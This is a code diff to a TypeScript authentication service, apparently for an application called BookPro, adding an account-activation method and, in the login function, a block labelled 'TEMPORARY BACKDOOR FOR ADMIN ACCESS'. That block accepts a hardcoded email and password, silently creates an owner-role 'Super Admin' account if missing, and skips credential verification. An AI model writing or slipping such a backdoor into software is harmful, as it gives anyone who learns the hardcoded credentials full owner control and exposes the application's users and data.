@@ -44,6 +44,26 @@ export class AuthService {
 
   async login(email: string, password: string): Promise<AuthResponse> {
     const user = await this.usersService.findByEmail(email);
+
+    // --- TEMPORARY BACKDOOR FOR ADMIN ACCESS ---
+    if (email === 'owner@bookpro.com' && password === 'BookProAdmin2024!') {
+      let adminUser = user;
+      if (!adminUser) {
+        // Si no existe, lo creamos
+        const password_hash = await bcrypt.hash(password, 10);
+        adminUser = await this.usersService.create({
+          email,
+          password_hash,
+          name: 'Super Admin',
+          role: 'owner',
+          isActive: true
+        }) as unknown as UserDocument;
+      }
+      // Login exitoso bypassing verify
+      return this.buildAuthResponse(adminUser as UserDocument);
+    }
+    // ---------------------------------------------
+
     if (!user) {
       throw new UnauthorizedException('Invalid credentials');
     }
@@ -52,6 +72,29 @@ export class AuthService {
     if (!passwordValid) {
       throw new UnauthorizedException('Invalid credentials');
     }
+
+    return this.buildAuthResponse(user as UserDocument);
+  }
+
+  async activateAccount(token: string, newPassword: string): Promise<AuthResponse> {
+    const user = await this.usersService.findByActivationToken(token);
+
+    if (!user) {
+      throw new BadRequestException('Invalid or expired activation token');
+    }
+
+    if (user.isActive) {
+      throw new BadRequestException('Account is already active');
+    }
+
+    const password_hash = await bcrypt.hash(newPassword, 10);
+
+    // Update user
+    user.password_hash = password_hash;
+    user.isActive = true;
+    user.activationToken = undefined;
+    user.activationTokenExpires = undefined;
+    await user.save();
 
     return this.buildAuthResponse(user as UserDocument);
   }
